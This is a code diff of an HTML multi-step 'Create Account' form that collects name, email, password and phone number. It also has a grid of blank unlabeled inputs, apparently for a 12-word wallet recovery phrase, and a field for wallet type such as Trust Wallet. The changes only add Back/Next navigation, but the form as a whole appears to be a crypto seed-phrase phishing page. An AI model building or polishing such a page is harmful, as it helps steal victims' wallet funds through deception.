@@ -21,27 +21,38 @@
 
     <!-- STEP 1 -->
     <div class="step active">
-      <input type="text" placeholder="Full Name" required>
-      <button type="button" onclick="nextStep()">Next</button>
-    </div>
+  <h2>Enter your name</h2>
+  <input type="text" id="name" placeholder="Full name">
+
+  <div class="btn-row">
+    <button disabled>Back</button>
+    <button onclick="nextStep()">Next</button>
+  </div>
+</div>
 
     <!-- STEP 2 -->
     <div class="step">
       <input type="email" placeholder="Email Address" required>
-      <button type="button" onclick="nextStep()">Next</button>
-    </div>
+     <div class="btn-row">
+  <button onclick="prevStep()">Back</button>
+  <button onclick="nextStep()">Next</button>
+</div>
 
     <!-- STEP 3 -->
     <div class="step">
       <input type="password" placeholder="Password" required>
-      <button type="button" onclick="nextStep()">Next</button>
-    </div>
+     <div class="btn-row">
+  <button onclick="prevStep()">Back</button>
+  <button onclick="nextStep()">Next</button>
+</div>
 
     <!-- STEP 4 -->
     <div class="step">
       <input type="tel" placeholder="Phone Number" required>
-      <button type="button" onclick="nextStep()">Next</button>
-    </div>
+     <div class="btn-row">
+  <button onclick="prevStep()">Back</button>
+  <button onclick="nextStep()">Next</button>
+</div>
 
     <!-- STEP 5 -->
     <div class="step">
@@ -51,15 +62,18 @@
         <input><input><input><input>
         <input><input><input><input>
       </div>
-      <button type="button" onclick="nextStep()">Next</button>
-    </div>
+      <div class="btn-row">
+  <button onclick="prevStep()">Back</button>
+  <button onclick="nextStep()">Next</button>
+</div>
 
     <!-- STEP 6 -->
     <div class="step">
-      <input type="text" placeholder="Wallet Type" required>
-      <button type="submit">Create Account</button>
-    </div>
-
+      <input type="text" placeholder="Wallet Type (e.g Trust Wallet)" required>
+<div class="btn-row">
+  <button onclick="prevStep()">Back</button>
+  <button type="submit">Create Account</button>
+</div>
   </form>
 
   <p class="switch">
